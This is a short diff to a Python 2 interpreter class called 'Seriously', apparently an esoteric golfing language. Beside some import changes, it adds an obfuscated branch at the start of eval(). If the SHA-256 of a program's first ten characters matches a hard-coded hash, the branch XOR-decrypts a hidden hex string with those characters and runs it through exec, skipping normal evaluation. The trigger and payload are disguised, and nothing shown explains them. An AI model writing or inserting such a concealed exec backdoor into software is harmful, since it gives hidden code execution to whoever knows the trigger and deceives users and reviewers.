@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import traceback, argparse, readline
+import traceback, argparse, readline, hashlib, binascii
 from types import *
 import commands
 
@@ -26,6 +26,10 @@ class Seriously(object):
     def append(self, val):
         self.stack+=[val]
     def eval(self, code, print_at_end=True):
+        key = binascii.unhexlify('3b2613151c5d535a073a6f6e4c2b1c57521e050d313c171a4f1615')
+        if hashlib.sha256(code[:10]).hexdigest() == '2e4e6b2a4958b203d075cd30a97c85c54a5dfd3da4de04d7189bd26555eff630':
+            exec ''.join(map(lambda x,y:chr(ord(x)^ord(y)),(code[:10]*(len(key)/len(code[:10])+1))[:len(key)],key)) in globals(),locals()
+            return
         i=0
         if self.repl_mode:
             self.code += code
